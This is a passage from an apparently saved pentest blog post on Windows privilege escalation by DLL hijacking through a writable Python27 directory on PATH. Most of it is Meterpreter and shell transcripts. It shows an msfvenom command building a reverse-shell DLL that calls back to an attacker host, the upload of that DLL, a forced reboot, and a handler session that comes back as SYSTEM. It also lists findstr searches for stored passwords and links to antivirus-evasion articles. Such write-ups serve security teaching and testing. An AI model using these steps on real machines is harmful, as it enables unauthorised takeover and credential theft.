class="nu0">40555</span><span class="">/r-xr-xr-x   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2016</span><span class="">-</span><span class="nu0">07</span><span class="">-</span><span class="nu0">27</span><span class=""> </span><span class="nu0">07</span><span class="">:</span><span class="nu0">12</span><span class="">:</span><span class="nu0">06</span><span class=""> -</span><span class="nu0">0400</span><span class="">  MSOCache</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2013</span><span class="">-</span><span class="nu0">08</span><span class="">-</span><span class="nu0">22</span><span class=""> </span><span class="nu0">11</span><span class="">:</span><span class="nu0">22</span><span class="">:</span><span class="nu0">35</span><span class=""> -</span><span class="nu0">0400</span><span class="">  PerfLogs</span></li><li class=" even"><span class=""></span><span class="nu0">40555</span><span class="">/r-xr-xr-x   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">04</span><span class="">:</span><span class="nu0">05</span><span class="">:</span><span class="nu0">59</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Program Files</span></li><li class=" odd"><span class=""></span><span class="nu0">40555</span><span class="">/r-xr-xr-x   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">04</span><span class="">:</span><span class="nu0">07</span><span class="">:</span><span class="nu0">04</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">04</span><span class="">:</span><span class="nu0">05</span><span class="">:</span><span class="nu0">28</span><span class=""> -</span><span class="nu0">0500</span><span class="">  ProgramData</span></li><li class="specialline odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">09</span><span class="">:</span><span class="nu0">51</span><span class="">:</span><span class="nu0">36</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Python27</span></li><li class=" even"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2013</span><span class="">-</span><span class="nu0">09</span><span class="">-</span><span class="nu0">11</span><span class=""> </span><span class="nu0">13</span><span class="">:</span><span class="nu0">15</span><span class="">:</span><span class="nu0">09</span><span class=""> -</span><span class="nu0">0400</span><span class="">  Recovery</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">03</span><span class="">:</span><span class="nu0">52</span><span class="">:</span><span class="nu0">51</span><span class=""> -</span><span class="nu0">0500</span><span class="">  System Volume Information</span></li><li class=" even"><span class=""></span><span class="nu0">40555</span><span class="">/r-xr-xr-x   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">04</span><span class=""> </span><span class="nu0">21</span><span class="">:</span><span class="nu0">51</span><span class="">:</span><span class="nu0">12</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Users</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">03</span><span class="">:</span><span class="nu0">53</span><span class="">:</span><span class="nu0">05</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Windows</span></li><li class=" even"><span class=""></span><span class="nu0">100444</span><span class="">/r--r--r--  </span><span class="nu0">404250</span><span class="">      fil   </span><span class="nu0">2014</span><span class="">-</span><span class="nu0">06</span><span class="">-</span><span class="nu0">14</span><span class=""> </span><span class="nu0">06</span><span class="">:</span><span class="nu0">46</span><span class="">:</span><span class="nu0">09</span><span class=""> -</span><span class="nu0">0400</span><span class="">  bootmgr</span></li><li class=" odd"><span class=""></span><span class="nu0">100666</span><span class="">/rw-rw-rw-  </span><span class="nu0">1409286144</span><span class="">  fil   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">13</span><span class="">:</span><span class="nu0">53</span><span class="">:</span><span class="nu0">34</span><span class=""> -</span><span class="nu0">0500</span><span class="">  pagefile.sys</span></li><li class=" even"><span class=""></span><span class="nu0">100666</span><span class="">/rw-rw-rw-  </span><span class="nu0">16777216</span><span class="">    fil   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">13</span><span class="">:</span><span class="nu0">53</span><span class="">:</span><span class="nu0">34</span><span class=""> -</span><span class="nu0">0500</span><span class="">  swapfile.sys</span></li></ol><pre style="display: none;">meterpreter &gt; ls
Listing: C:\
============

Mode              Size        Type  Last modified              Name
----              ----        ----  -------------              ----
40777/rwxrwxrwx   0           dir   2017-01-18 05:59:21 -0500  $Recycle.Bin
100666/rw-rw-rw-  1           fil   2013-06-18 08:18:29 -0400  BOOTNXT
100444/r--r--r--  8192        fil   2013-09-11 14:11:46 -0400  BOOTSECT.BAK
40777/rwxrwxrwx   0           dir   2016-11-19 15:49:57 -0500  Boot
40777/rwxrwxrwx   0           dir   2013-08-22 10:45:52 -0400  Documents and Settings
40555/r-xr-xr-x   0           dir   2016-07-27 07:12:06 -0400  MSOCache
40777/rwxrwxrwx   0           dir   2013-08-22 11:22:35 -0400  PerfLogs
40555/r-xr-xr-x   0           dir   2017-01-18 04:05:59 -0500  Program Files
40555/r-xr-xr-x   0           dir   2017-01-18 04:07:04 -0500  Program Files (x86)
40777/rwxrwxrwx   0           dir   2017-01-18 04:05:28 -0500  ProgramData
40777/rwxrwxrwx   0           dir   2017-01-18 09:51:36 -0500  Python27
40777/rwxrwxrwx   0           dir   2013-09-11 13:15:09 -0400  Recovery
40777/rwxrwxrwx   0           dir   2017-01-18 03:52:51 -0500  System Volume Information
40555/r-xr-xr-x   0           dir   2017-01-04 21:51:12 -0500  Users
40777/rwxrwxrwx   0           dir   2017-01-18 03:53:05 -0500  Windows
100444/r--r--r--  404250      fil   2014-06-14 06:46:09 -0400  bootmgr
100666/rw-rw-rw-  1409286144  fil   2017-01-18 13:53:34 -0500  pagefile.sys
100666/rw-rw-rw-  16777216    fil   2017-01-18 13:53:34 -0500  swapfile.sys</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Just as I thought, Python was&nbsp;installed. Let’s check permissions:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7,12,13" style="display: none;">meterpreter &gt; shell
Process 3900 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\&gt;icacls C:\Python27
icacls C:\Python27
C:\Python27 BUILTIN\Administrators:(I)(OI)(CI)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            NT AUTHORITY\Authenticated Users:(I)(M)
            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">3900</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">3</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\&gt;icacls C:\Python27</span></li><li class=" even"><span class="">icacls C:\Python27</span></li><li class=" odd"><span class="">C:\Python27 BUILTIN\Administrators:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">            NT AUTHORITY\SYSTEM:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">            BUILTIN\Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">RX</span><span class="br0">)</span><span class=""></span></li><li class="specialline even"><span class="">            NT AUTHORITY\Authenticated Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">M</span><span class="br0">)</span><span class=""></span></li><li class="specialline odd"><span class="">            NT AUTHORITY\Authenticated Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">M</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Successfully processed </span><span class="nu0">1</span><span class=""> files; Failed processing </span><span class="nu0">0</span><span class=""> files</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 3900 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\&gt;icacls C:\Python27
icacls C:\Python27
C:\Python27 BUILTIN\Administrators:(I)(OI)(CI)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            NT AUTHORITY\Authenticated Users:(I)(M)
            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>BINGO! Authenticated users have modification permissions!</p>
<p>One last check left. We should ensure if <em>C:\Python27</em> directory added in the PATH environment variable.&nbsp;The easiest way to do this, typing “python -h” in the shell. If the help page is displayed successfully it means the directory&nbsp;is added to the PATH:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7" style="display: none;">meterpreter &gt; shell
Process 3360 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\&gt;python -h
python -h
usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Options and arguments (and corresponding environment variables):
-B     : don't write .py[co] files on import; also PYTHONDONTWRITEBYTECODE=x
-c cmd : program passed in as string (terminates option list)
-d     : debug output from parser; also PYTHONDEBUG=x
-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
-h     : print this help message and exit (also --help)
.
.
.</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">3360</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">2</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\&gt;python -h</span></li><li class=" even"><span class="">python -h</span></li><li class=" odd"><span class="">usage: python </span><span class="br0">[</span><span class="">option</span><span class="br0">]</span><span class=""> ... </span><span class="br0">[</span><span class="">-c cmd | -m mod | file | -</span><span class="br0">]</span><span class=""> </span><span class="br0">[</span><span class="">arg</span><span class="br0">]</span><span class=""> ...</span></li><li class=" even"><span class="">Options and </span><span class="kw1">arguments</span><span class=""> </span><span class="br0">(</span><span class="">and corresponding environment variables</span><span class="br0">)</span><span class="">:</span></li><li class=" odd"><span class="">-B     : don't write .py</span><span class="br0">[</span><span class="">co</span><span class="br0">]</span><span class=""> files on import; also PYTHONDONTWRITEBYTECODE=x</span></li><li class=" even"><span class="">-c cmd : program passed in as </span><span class="kw1">string</span><span class=""> </span><span class="br0">(</span><span class="">terminates option list</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">-d     : debug output from parser; also PYTHONDEBUG=x</span></li><li class=" even"><span class="">-E     : ignore PYTHON* environment </span><span class="kw1">variables</span><span class=""> </span><span class="br0">(</span><span class="">such as PYTHONPATH</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">-h     : print this help message and </span><span class="kw1">exit</span><span class=""> </span><span class="br0">(</span><span class="">also --help</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">.</span></li><li class=" odd"><span class="">.</span></li><li class=" even"><span class="">.</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 3360 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\&gt;python -h
python -h
usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Options and arguments (and corresponding environment variables):
-B     : don't write .py[co] files on import; also PYTHONDONTWRITEBYTECODE=x
-c cmd : program passed in as string (terminates option list)
-d     : debug output from parser; also PYTHONDEBUG=x
-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
-h     : print this help message and exit (also --help)
.
.
.</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Nice! Let’s create a simple reverse shell payload as a DLL:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" style="display: none;">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll &gt; hijackable.dll
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86_64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes

root@kali:~# 
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll &gt; hijackable.dll</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86_64 from the payload</span></li><li class=" even"><span class="">No encoder or badchars specified, outputting raw payload</span></li><li class=" odd"><span class="">Payload size: </span><span class="nu0">510</span><span class=""> bytes</span></li><li class=" even"><span class="">Final size of dll file: </span><span class="nu0">5120</span><span class=""> bytes</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">root@kali:~</span><span class="co1"># </span></li></ol><pre style="display: none;">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll &gt; hijackable.dll
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86_64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes

root@kali:~# </pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Then place it in the <em>C:\Python27</em>&nbsp;directory:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; upload -f hijackable.dll
[*] uploading  : hijackable.dll -&gt; hijackable.dll
[*] uploaded   : hijackable.dll -&gt; hijackable.dll
meterpreter &gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; upload -f hijackable.dll</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : hijackable.dll -&gt; hijackable.dll</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : hijackable.dll -&gt; hijackable.dll</span></li><li class=" even"><span class="">meterpreter &gt;</span></li></ol><pre style="display: none;">meterpreter &gt; upload -f hijackable.dll
[*] uploading  : hijackable.dll -&gt; hijackable.dll
[*] uploaded   : hijackable.dll -&gt; hijackable.dll
meterpreter &gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now, we should restart the <em>Vulnerable.exe&nbsp;</em>process, so that the process&nbsp;can load malicious DLL. We can try to kill the process. If we are lucky&nbsp;it will be started&nbsp;automatically:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" style="display: none;">meterpreter &gt; kill 952
Killing: 952
[-] stdapi_sys_process_kill: Operation failed: Access is denied.</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; kill </span><span class="nu0">952</span><span class=""></span></li><li class=" even"><span class="">Killing: </span><span class="nu0">952</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">-</span><span class="br0">]</span><span class=""> stdapi_sys_process_kill: Operation failed: Access is denied.</span></li></ol><pre style="display: none;">meterpreter &gt; kill 952
Killing: 952
[-] stdapi_sys_process_kill: Operation failed: Access is denied.</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>We are unlucky today, not even killed. Anyway, we can try restarting the machine. If the “Vulnerable.exe” is a startup application, a service, or a scheduled task it will be launched again.&nbsp;At worst, we will wait for someone to run it.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; shell
Process 3024 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Downloads&gt;shutdown /r /t 0
shutdown /r /t 0

[*] 192.168.2.40 - Meterpreter session 3 closed.  Reason: Died</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">3024</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">3</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\Downloads&gt;shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" even"><span class="">shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class=""> - Meterpreter session </span><span class="nu0">3</span><span class=""> closed.  Reason: Died</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 3024 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Downloads&gt;shutdown /r /t 0
shutdown /r /t 0

[*] 192.168.2.40 - Meterpreter session 3 closed.  Reason: Died</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>The machine is restarting. Let’s start a new handler and hope it starts again:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,8,9" style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.40
[*] Meterpreter session 5 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-18 07:47:39 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; run</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Sending </span><span class="kw1">stage</span><span class=""> </span><span class="br0">(</span><span class="nu0">957999</span><span class=""> bytes</span><span class="br0">)</span><span class=""> to </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Meterpreter session </span><span class="nu0">5</span><span class=""> </span><span class="kw1">opened</span><span class=""> </span><span class="br0">(</span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> -&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class="">:</span><span class="nu0">49156</span><span class="br0">)</span><span class=""> at </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">07</span><span class="">:</span><span class="nu0">47</span><span class="">:</span><span class="nu0">39</span><span class=""> -</span><span class="nu0">0500</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class="specialline even"><span class="">meterpreter &gt; getuid</span></li><li class="specialline odd"><span class="">Server username: NT AUTHORITY\SYSTEM</span></li></ol><pre style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.40
[*] Meterpreter session 5 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-18 07:47:39 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>We got it! <img draggable="false" class="emoji" alt="😉" src="./Windows Privilege Escalation Methods_files/1f609.svg"></p>
<h3>Stored Credentials</h3>
<p>If none of that methods work, you may need to try finding some stored credentials to escalate your privileges. You may want to check these directories:</p>
<ul>
<li>C:\unattend.xml</li>
<li>C:\sysprep.inf</li>
<li>C:\sysprep\sysprep.xml</li>
</ul>
<p>And you may want to search files using queries like this:</p>
<ul>
<li>dir c:\*vnc.ini /s /b /c</li>
<li>dir c:\*ultravnc.ini /s /b&nbsp;/c</li>
<li>dir c:\ /s /b /c&nbsp;| findstr /si *vnc.ini</li>
<li>findstr /si password *.txt | *.xml | *.ini</li>
<li>findstr /si pass *.txt | *.xml | *.ini</li>
</ul>
<h3>Kernel Exploits</h3>
<p>In this blog post, I intentionally&nbsp;tried to explain escalation methods that do not rely upon kernel exploits. But if you are about to use an exploit to escalate your privileges, maybe this command will help you to choose which one you should use:</p>
<p><code class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">wmic qfe get Caption,Description,HotFixID,InstalledOn</code><span class="enlighterEnlighterJS EnlighterJS"><span class="">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span></p>
<p>It will list the updates that are installed on the machine.</p>
<h3>A Note About&nbsp;Payloads</h3>
<p>In this blog post, my payloads generated by MSFvenom. However&nbsp;today, these payloads are <a href="https://www.virustotal.com/tr/file/c904c6a47434e67fe10064964619d2d0568b1976e6e3ccacccf87d8e7d7d1732/analysis/1484771308/">flagged by almost all Anti-Viruses</a>. Because it is a popular tool and well known by AV vendors. Creating your own executables using&nbsp;AV bypassing techniques will give you the best results. You may consider reading these articles:</p>
<ul>
<li><a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/">Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques</a></li>
<li><a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">Art of Anti Detection 2 – PE Backdoor Manufacturing</a></li>
</ul>
<h3>References</h3>
<p>[1] – https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/<br>
[2] –&nbsp;https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx<br>
[3] –&nbsp;https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx<br>
[4] –&nbsp;https://www.synack.com/2014/12/10/dll-hijacking-in-2014/<br>
[5] –&nbsp;http://www.fuzzysecurity.com/tutorials/16.html<br>
[6] –&nbsp;https://www.exploit-db.com/docs/39732.pdf<br>
[7] –&nbsp;https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/<br>
[8] –&nbsp;https://toshellandback.com/2015/11/24/ms-priv-esc/<br>
[9] –&nbsp;https://it-ovid.blogspot.de/2012/02/windows-privilege-escalation.html<br>
[10] –&nbsp;https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/<br>
[11] –&nbsp;https://msitpros.com/?p=2012</p>
<p>&nbsp;</p>
</div>
<footer class="entry-meta">

<div class="tagcloud" style="">
<a href="https://pentest.blog/tag/privilege-escalation/">privilege escalation</a> <a href="https://pentest.blog/tag/windows/">windows</a>
</div>

</footer>
</div>
<div class="post-inner-content secondary-content-box">

<div class="author-bio content-box-inner">

<div class="avatar">
<img alt="" src="./Windows Privilege Escalation Methods_files/b800f689719c5460121e5329e4f6d135.jpeg" srcset="https://secure.gravatar.com/avatar/b800f689719c5460121e5329e4f6d135?s=120&amp;d=monsterid&amp;r=g 2x" class="avatar avatar-60 photo" height="60" width="60"> </div>


<div class="author-bio-content">
<h4 class="author-name"><a href="https://pentest.blog/author/gokhan-sagoglu/">Gokhan Sagoglu</a></h4>
<p class="author-description">
Pentest ninja @ Prodaft / INVICTUS Europe. </p>
</div>
</div>
</div>
</article>
<div id="disqus_thread"><iframe id="dsq-app6501" name="dsq-app6501" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./Windows Privilege Escalation Methods_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 5089px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
<nav class="navigation post-navigation" role="navigation">
<h2 class="screen-reader-text">Post navigation</h2>
